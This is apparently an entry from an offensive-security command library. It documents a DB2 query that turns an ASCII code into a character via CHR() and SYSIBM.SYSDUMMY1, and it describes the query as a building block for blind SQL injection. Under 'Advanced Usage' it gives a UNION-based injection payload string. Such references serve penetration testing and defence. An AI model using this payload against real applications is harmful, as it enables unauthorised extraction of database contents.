---
id: 68220583-c081-479c-901e-03b8affd51bf
name: db2-select-character-by-ascii
type: command
executor: sql
data: select chr($_ASCII_CODE) from sysibm.sysdummy1
output: null
created_at: '2023-04-06T03:56:32.937194+00:00'
updated_at: '2023-04-10T20:22:03.761451+00:00'
platforms:
  - Database
  - DB2
tags:
  - sql-injection
  - db2
  - ascii-extraction
verified: true
validated: true
---

# db2-select-character-by-ascii

## Command

```sql
select chr($_ASCII_CODE) from sysibm.sysdummy1
```

## Description

This SQL command retrieves a specific character from the DB2 SYSIBM.SYSDUMMY1 dummy table by converting an ASCII code to its character equivalent using the CHR() function. It is used in SQL injection payloads to exfiltrate data character-by-character in blind scenarios, where direct SELECTs are filtered.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ASCII_CODE | Integer ASCII value (e.g., 65 for 'A', 97 for 'a') to convert to character | Yes |

## Examples

### Basic Usage

```sql
select chr(65) from sysibm.sysdummy1
```

Returns: 'A'

### Advanced Usage

In injection: `' OR 1=1 UNION SELECT CHR($_ASCII_CODE) FROM SYSIBM.SYSDUMMY1 --`

Use to test specific characters in conditional payloads.

## Expected Output

A single character corresponding to the ASCII code, e.g.,

```
CHR(65)
-----
A

1 record(s) selected.
```

In web injection context, the character may appear in response body, error message, or inferred via application behavior.

## Related

- [[procedures/DB2-SQL-Injection-ASCII-Value-Extraction]]
- [[techniques/Exploitation of Remote Services|T1210]]
